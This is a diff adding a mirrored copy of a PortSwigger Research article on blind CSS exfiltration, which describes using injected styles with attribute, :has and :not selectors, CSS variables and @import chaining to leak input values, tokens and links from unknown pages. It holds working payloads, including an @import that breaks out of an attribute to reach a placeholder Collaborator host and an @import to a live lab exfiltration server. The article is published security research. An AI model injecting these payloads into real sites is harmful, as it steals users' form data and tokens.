@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Blind CSS Exfiltration: exfiltrate unknown web pages</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; line-height: 1.55; color: #e2e8f0; max-width: 800px; margin: 26px auto; padding: 0 18px; background: #0a0e27; }
+  h1 { color: #00d9ff; margin-bottom: 0.35em; line-height: 1.22; font-size: clamp(1.45rem, 2.1vw, 1.95rem); font-weight: 700; }
+  h2, h3 { line-height: 1.28; margin: 1.1em 0 0.45em; }
+  .metadata { color: #94a3b8; font-size: 0.86em; margin-bottom: 1.2em; border-bottom: 1px solid rgba(0,217,255,0.2); padding-bottom: 0.7em; }
+  img { max-width: 100%; width: auto !important; height: auto !important; object-fit: contain !important; border-radius: 8px; display: block; margin: 0.6em auto; }
+  a { color: #00d9ff; }
+  p { margin-bottom: 0.72em; line-height: 1.58; }
+  ul, ol { margin: 0.5em 0 0.9em 1.1em; }
+  li { margin: 0.18em 0; }
+  blockquote { border-left: 3px solid #825ee4; padding-left: 12px; margin: 0.8em 0; color: #94a3b8; }
+  code { background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 3px; color: #ff79c6; }
+  pre { background: rgba(0,0,0,0.4); padding: 12px; border-radius: 6px; overflow-x: auto; }
+  .article-elevator { position: fixed; right: 14px; bottom: 14px; display: flex; flex-direction: column; gap: 8px; z-index: 9999; }
+  .article-elevator-btn { width: 36px; height: 36px; border: 1px solid rgba(0,217,255,0.35); border-radius: 10px; background: rgba(10,14,39,0.88); color: #00d9ff; cursor: pointer; font-size: 16px; line-height: 1; }
+  .article-elevator-btn:hover { background: rgba(10,14,39,1); }
+</style>
+</head>
+<body>
+  <h1>Blind CSS Exfiltration: exfiltrate unknown web pages</h1>
+  <div class="metadata">
+    Source: PortSwigger Research | Date: 12/5/2023 4:37:20 PM | Lang: EN |
+    <a href="https://portswigger.net/research/blind-css-exfiltration" target="_blank">Original Article</a>
+  </div>
+  <div class="content">
+    <div><div> <div> <p><img alt="Gareth Heyes" src="https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png"></p>
+</div> <ul> <li> <p><span></span><strong>Published: </strong>05 December 2023 at 15:37 UTC</p> </li> <li> <p><strong>Updated: </strong>11 July 2024 at 10:09 UTC</p> </li> <li> </li> </ul> <p><img src="https://portswigger.net/cms/images/5b/dc/8777-article-css-exfiltration-article.jpg" alt="Picture of an attacker exfiltrating data using CSS"><br></p><p>This is a gif of the exfiltration process (We've increased the speed so you're not waiting around for 1 minute). Read on to discover how this works...</p><p><img src="https://portswigger.net/cms/images/fe/c1/2304-article-blind-css-exfiltration-demo.gif" alt="Video demo of the exfiltration process"></p><h2>CSS Cafe presentation</h2>
+<p>I presented this technique at <a href="https://www.css.cafe/">CSS Cafe</a>:</p> <p></p>
+<p>
+The slides are available here:<br><a href="https://portswigger.net/kb/papers/blind-css-exfiltration-exfiltrate-unknown-web-pages-slides.pdf">Blind CSS Exfiltration slides</a>.</p>
+<h2>Why would we want to do blind CSS exfiltration?</h2>
+<p>Imagine you've got a blind HTML injection vulnerability but you can't get <a href="https://portswigger.net/web-security/cross-site-scripting">XSS</a> because of the site's <a href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy">CSP</a> or perhaps the site has a server-side or DOM-based filter such as DOMPurify. JavaScript is off the table but they allow styles because they're just styles right? What possible damage can you do with just CSS?</p><p>In this post we'll recap known techniques to extract data with attribute selectors and then show you a novel technique with the brand new :has selector. To achieve extraction of the majority of form elements and anchor tags with just CSS!
+</p><p>The first step is to confirm you can inject styles into your parameter. You can do this using Burp Collaborator by injecting an @import rule with a Collaborator payload:
+</p><p><code>"&gt;&lt;style&gt;@import'//YOUR-PAYLOAD.oastify.com'&lt;/style&gt;</code></p><p>Once you've confirmed you have an interaction from the Collaborator using Out-of-band <a href="https://portswigger.net/burp/application-security-testing">Application Security Testing</a> (<a href="https://portswigger.net/burp/application-security-testing/oast">OAST</a>). You know you can inject styles and JavaScript doesn't work but you have no idea what you are injecting into and have no idea what the structure of the page looks like. What you have is blind CSS injection! Let's learn how to exploit this vulnerability class.</p> <h2>Triggering requests using CSS variables</h2> <p>In order to obtain data from the page you have to trigger a request to an external server and this is where <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties">CSS variables</a> come in. You can use CSS variables as an on/off switch that triggers a conditional request using background images. As long as your variable is defined with a url() and a fallback that is a valid CSS property value (i.e. "none" for a background image) then you can use this variable to trigger a request by setting the variable:
+</p><p><code>&lt;input value=1337&gt;<br>&lt;style&gt;<br>input[value="1337"] {<br> --value: url(/collectData?value=1337);<br>}<br>input {<br> background:var(--value,none);<br>}<br>&lt;/style&gt;
+</code></p><p>The preceding example sets a CSS variable called "--value", this variable is set to a background image when the value of the input equals "1337". The fallback is used to set the background to "none" if the variable is not defined. Note, the fallback is optional but for the purposes of blind CSS exfiltration it's actually very important.</p><h2>How to extract data using CSS</h2><h3>Extracting data with attribute selectors</h3><p>Attribute selectors are an extremely powerful way to extract data. You can use them to check if attributes begin, end or even contain certain characters. This is the core of how CSS exfiltration works. Let's say for instance that you want to check if an input begins with the character "a":
+</p><p><code>
+&lt;style&gt;<br>input[value^="a"] {<br> color:red;<br>}<br>&lt;/style&gt;<br>&lt;input value=abc&gt;<br>&lt;input value=def&gt;<br></code></p><p>In the preceding example, there are two inputs with different values, the first begins with "a" and therefore the attribute selector will match the first input and turn the colour of the text red. If we wanted to match the second input we could also use the starts with "^=" selector or we could use the ends with "$=" selector:
+</p><p><code>&lt;style&gt;<br>input[value$="f"] {<br> color:red;<br>}<br>&lt;/style&gt;<br>&lt;input value=abc&gt;<br>&lt;input value=def&gt;
+</code></p><p>The preceding example now changes the text red on the second element because the value ends with "f". Turning the text colour red might prove the selector works but it's no use for exfiltrating data. We need to combine attribute selectors with background images and CSS variables to send the data to an external server!
+</p><p><code>&lt;style&gt;<br>input[value^="a"] {<br> --starts-with-a:url(/startsWithA);<br>}<br>input{<br> background: var(--starts-with-a,none);<br>}<br>&lt;/style&gt;<br>&lt;input value=abc&gt;<br>&lt;input value=def&gt;
+</code></p><p>In the previous example, I define a variable called "--starts-with-a" and I assign this variable to the background image of the input and you'll notice if you observe the web page with devtools in the network tab you'll see a request is made for "/startsWithA". Notice I use a fallback of "none" this will be important later but all that does is: if the variable isn't defined then fallback to the none property value.</p><h2>Abusing the has selector to exfiltrate data on child nodes</h2><p>Great so we've recapped a well known technique and you should now be up to speed on what comes next.
+</p><h3>Attribute selector and :has</h3><p>You can combine attribute selectors with the :has selector. This enables you to make a background request even if the element in question doesn't allow it such as a hidden input. You might have seen some CSS exfiltrators use other CSS selectors such as + in order for a background request to be made:
+</p><p><code>&lt;input type=hidden value=1337&gt;&lt;div&gt;&lt;/div&gt;<br>&lt;style&gt;<br>input[value="1337"] + div {<br> background:url(/collectData?value=1337);<br>}<br>&lt;/style&gt;
+</code></p><p>In the preceding example the plus (next-sibling combinator) is used to set the background on the div element if the attribute on the input value is matched. The advantage of the :has selector is that removes the need for this and, in addition, because you don't need to know what element appears next, you can more easily exfiltrate unknown page structures:
+</p><p><code>&lt;div&gt;&lt;input type=hidden value=1337&gt;&lt;/div&gt;<br>&lt;style&gt;<br>div:has(input[value="1337"]) {<br> background:url(/collectData?value=1337);<br>}<br>&lt;/style&gt;
+</code></p><h3>What is the :has selector?</h3><p>The :has selector is a super powerful feature in CSS and when I first learned about it I was confused. So let me describe how I think about it in order for you to understand it. Imagine that :has is a function and that function will return the element to the left if any nodes underneath the element match the selector specified in the function argument. Of course, it isn't a function but I thought it would be useful to describe how I came to understand it. In CSS this is how you use the :has selector:
+</p><p><code>&lt;style&gt;<br>div {<br> display:none;<br>}<br>div:has(p) {<br> display:block;<br>}<br>&lt;/style&gt;<br>&lt;div&gt;<br>&lt;p&gt;I am visible&lt;/p&gt;<br>&lt;/div&gt;<br>&lt;div&gt;<br>I am NOT visible<br>&lt;/div&gt;
+</code></p><p>In the preceding example all divs are hidden with the div selector and then the :has selector is used to reveal specific divs (i.e. if a div has a paragraph element then its display property is changed to block and the div is shown). This means CSS allows you to change the properties of the parent based on the state of the child elements. But why would you need to do this for exfiltration? Glad you asked. I'll explain it in the next section.</p>
+<h2>Abusing the HTML selector to make requests regardless of HTML structure</h2><p>I thought about an unknown page structure for a while and I came to the conclusion that you could abuse the HTML tag and set a background on that. The reason you'd want to do that is that no site is going to use a background on the HTML element!</p>
+<p>You see, once you set a property with CSS any further assignments to the property will overwrite it, providing it is more specific or the same as the last, this is the cascade part of CSS. If we chose something like the body element to make our request it could be overwritten by the page styles and we wouldn't see our exfiltrated data.</p>
+<h2>Combining :has and :not selectors to identify multiple unknown elements</h2><p>Another problem I had was how do you extract data from elements when you have no idea of their structure? Because if you use ^="a" it will be overwritten when another input is encountered. For instance, imagine you are cycling through every character and checking the first one that rule is going to match at least once which as I mentioned the cascade would prevent more than one request going through. My first attempt was to use the nth-of-type() selector and it appeared to work perfectly but actually, it required each element of the same type to be next to each other. Damn, that just isn't going to work, most form elements are going to be wrapped in divs etc. Then after thinking for a while, I came up with a fantastic idea, once a value had been enumerated I could then use the :not() selector to eliminate the element then the exfiltrator would move onto the next element:</p> <p><code>
+&lt;style&gt;<br>html:has(input[name^="m"]):not(input[name="mytoken"]) {<br> background:url(/m);<br>}<br>&lt;/style&gt;<br>&lt;input name=mytoken value=1337&gt;<br>&lt;input name=myname value=gareth&gt;
+</code></p><p>As the preceding example shows you can use the :not() selector to extract the next attribute value once you've already obtained another element of the same type. I really love this hack because it's so elegant and doesn't increase the size of the CSS file too much.</p>
+<h2>Extracting large amounts of data using @import chaining</h2><p>We've got the basis of my technique now but we need to make lots of requests to extract lots of data. There were two fantastic posts by <a href="https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b">d0nut
+</a> and <a href="https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf">Pepe Vila</a> that showed how you can use @import chaining to obtain large amounts of data very quickly. I used Pepe's script as the basis of CSS exfiltrator but it soon morphed into exfiltrating unknown structures. He used a counter to determine if the exfiltration was finished, I had to change this to use a timer because I don't know how many elements I'm actually extracting.
+</p>
+<p>Using imports I could wait for the data to be extracted because as the above posts mention you can block the CSS responses from returning until you're ready to move onto the next chunk. But the problem remained I had no idea how many elements I had to extract! There could be 1 or 20 and I had no idea how to find out. How could I possibly get around this?</p>
+<h2>Using multiple backgrounds to send unlimited requests</h2>
+<p>I didn't know how many requests I'd need and didn't know what elements the page had so again I thought about this for a while and concluded that I could use CSS variables to assign multiple background images to the HTML tag background property. Remember the cascade problem? You can't assign to a property value after it's already assigned otherwise it would get overwritten. My solution was to initialise a large number of variables based on the configuration of the script and assign these variables to multiple backgrounds of the HTML element and this is why the fallback is important, if I didn't use a fallback then the background would get an invalid assignment and therefore all the requests would fail - by using a fallback the background would be assigned to none unless a character was found.</p>
+<h2>Putting it all together</h2>
+<p>By using all the techniques mentioned above I could finally construct a blind CSS exfiltrator! It can extract input’s names and values, textarea name attributes, form actions and even anchor links. Almost every ASCII character is supported! I excluded stuff like NULL and new lines because they aren't likely to be included in attributes, but if you think they could be you can easily add them by modifying the script.</p><p>You can grab the source code of the exfiltrator from Github:</p><p><a href="https://github.com/hackvertor/blind-css-exfiltration">Blind CSS Exfiltrator</a></p> <h2>Using the exfiltrator</h2> <p>To run your own version of the exfiltrator you need to first grab the source code from above and then run it using node:
+</p><p><code>node css-exfiltrator-server.js</code></p><p>This will start the server. Once the server is started it should be running on localhost:5001 by default. You can change this in the code. To start an exfiltration you simply need to make an @import request to the exfiltrator server:</p><p><code>&lt;style&gt;<br>@import 'http://localhost:5001/start'; <br>&lt;/style&gt;
+</code></p><p>This will then start the exfiltration process. You can use the network tab in dev tools to observe the process. Note you'd probably need to host this on a H2 enabled server. Otherwise you'll get pre-flight requests because of the different protocols. You can use a ProxyPass rule in Apache to forward to the local address:
+</p><p><code>ProxyPass /blind-css-exfiltration http://localhost:5001</code></p><p>Once you have configured the ProxyPass rule you can then use your H2 server. Don't forget to change the hostname in the script and of course change your @import rule to use the address of your external server like our demo. </p><h2>Displaying the results</h2>
+<p>By default, it displays the results in the console on the server as well as showing the results in the browser using pure CSS :). If you don't want the results displayed in the browser you can set the flag SHOW_RESULTS_IN_BROWSER to false and it will just display the results in the console on the server.
+</p>
+<h2>Demo</h2> <p>You can get a demo of our exfiltrator using PortSwigger labs. Note you can only exfiltrate once per IP. If more than one person tries to exfiltrate with the same IP the previous session will be deleted. Note it's better to run the Exfiltrator on your own server and our server is unlikely to handle a lot of users. Enjoy!</p><p><code>
+&lt;style&gt;<br>@import 'https://portswigger-labs.net/blind-css-exfiltration/start';<br>&lt;/style&gt;
+</code></p> <p><a href="https://portswigger.net/research/articles">Back to all articles</a></p>
+</div></div>
+  </div>
+  <div class="article-elevator" aria-label="Navigation article">
+    <button class="article-elevator-btn" type="button" onclick="scrollToTop()">▲</button>
+    <button class="article-elevator-btn" type="button" onclick="scrollToBottom()">▼</button>
+  </div>
+  <script>
+    function scrollToTop() {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+    function scrollToBottom() {
+      window.scrollTo({ top: document.documentElement.scrollHeight, behavior: 'smooth' });
+    }
+    window.addEventListener('message', (event) => {
+      const data = event && event.data;
+      if (!data || data.type !== 'AI_PULSE_SCROLL') return;
+      if (data.direction === 'top') scrollToTop();
+      if (data.direction === 'bottom') scrollToBottom();
+    });
+  </script>
+</body>
+</html>
